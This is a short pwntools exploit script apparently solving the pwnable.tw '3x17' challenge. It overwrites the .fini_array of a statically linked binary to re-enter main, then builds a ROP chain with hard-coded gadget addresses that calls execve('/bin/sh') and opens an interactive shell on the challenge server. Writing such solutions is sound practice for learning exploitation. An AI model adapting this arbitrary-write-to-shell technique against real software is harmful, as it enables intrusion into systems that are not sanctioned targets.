#!/usr/bin/env python3
from pwn import *

elf = ELF('./3x17')
# context.update(binary=elf, log_level = 'debug')
# p = elf.process()
# gdb.attach(p, '''
# 	b *0x401c4b
# 	b *0x401c29
# 	b *0x00000000004b4148
# ''')
p = remote("chall.pwnable.tw", "10105")

# func
fini_array = 0x4b40f0
fini_array_caller = 0x402960
main_addr = 0x401b6d

# gadgets
pop_rdi = 0x0000000000401696 	# : pop rdi ; ret
pop_rdx = 0x0000000000446e35 	# : pop rdx ; ret
pop_rsi = 0x0000000000406c30 	# : pop rsi ; ret
pop_rax = 0x000000000041e4af 	# : pop rax ; ret
syscall = 0x00000000004022b4 	# : syscall
leave_ret = 0x0000000000401c4b 	# : leave ; ret

def overWrite(addr, data):
	p.sendlineafter(b'addr:', str(addr).encode())
	p.sendafter(b'data:', data)


overWrite(fini_array, p64(fini_array_caller) + p64(main_addr))
overWrite(fini_array + 2*8, p64(pop_rdi) + p64(fini_array + 11*8))
overWrite(fini_array + 4*8, p64(pop_rdx) + p64(0))
overWrite(fini_array + 6*8, p64(pop_rsi) + p64(0))
overWrite(fini_array + 8*8, p64(pop_rax) + p64(0x3b))
# gdb.attach(p, '''
# 	b *0x401b84
# ''')
# cmp 1
overWrite(fini_array + 10*8, p64(syscall) + b'/bin/sh\x00')
overWrite(fini_array, p64(leave_ret))

p.interactive()
